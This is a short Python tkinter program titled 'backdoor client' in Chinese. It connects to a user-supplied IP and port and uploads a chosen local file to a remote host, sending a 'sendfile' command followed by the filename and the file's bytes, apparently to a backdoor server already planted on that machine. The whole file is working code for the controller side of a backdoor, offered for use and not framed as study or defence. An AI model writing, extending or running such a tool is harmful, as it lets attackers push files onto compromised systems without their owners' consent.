from tkinter import *
import socket
from tkinter.filedialog import askopenfilename
import time
c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
def conn():
    HOST = ip.get()
    PORT = port.get()
    addr = (HOST,PORT)
    c.connect(addr)

def selectPath():
    path_ = askopenfilename()
    path.set(path_)
    
def submit():
    PATH = path.get()
    filename = PATH.split("/")[-1]
    with open(PATH,"rb") as f:
        data = f.read()
    
    c.send(b"sendfile")
    time.sleep(0.5)
    c.send(bytes(filename,encoding="gbk"))
    time.sleep(0.5)
    c.send(data)
    time.sleep(0.5)
    c.close()
    

def main():
    root = Tk()
    global ip
    ip = StringVar()
    global port
    port = IntVar()
    global path
    path = StringVar()
    root.title("后门客户端")
    iplabel = Label(text="输入IP:",font="Helvetica -15 bold") #文字标签字体
    iplabel.grid(row=0, column=0, padx=1, pady=1, sticky='ns')
    ipentry = Entry(textvariable=ip,width=15) #输入框内容和值 宽度
    ipentry.grid(row=0, column=1, sticky='ew', columnspan=1, padx=5, pady=5)
    portlabel = Label(text="输入端口:",font="Helvetica -15 bold")
    portlabel.grid(row=0, column=2, padx=5, pady=5, sticky=W)
    portentry = Entry(textvariable=port,width=5)
    portentry.grid(row=0, column=3, sticky='ew', columnspan=1, padx=5, pady=5)
    ok = Button(text="链接", default='active',command=conn) #定义按钮按下去就调用函数
    ok.grid(row=0, column=4,padx=8, pady=5) #第三列
    pathtext=Label(text="本地文件路径:",font="Helvetica -15 bold")
    pathtext.grid(row=2,column=0)
    pathentry = Entry(textvariable=path,width=45) #输入框内容和值 宽度
    pathentry.grid(row=2, column=1, sticky='ew', padx=5, pady=5)
    file = Button(text="本地文件选择", default='active',command=selectPath) #定义按钮按下去就调用函数
    file.grid(row=2, column=3,padx=9, pady=5)
    put = Button(text="上传", default='active',command=submit) #定义按钮按下去就调用函数
    put.grid(row=2, column=4,padx=9, pady=5)
    root.geometry("800x100")
    root.mainloop()

if __name__ == "__main__":
    main()
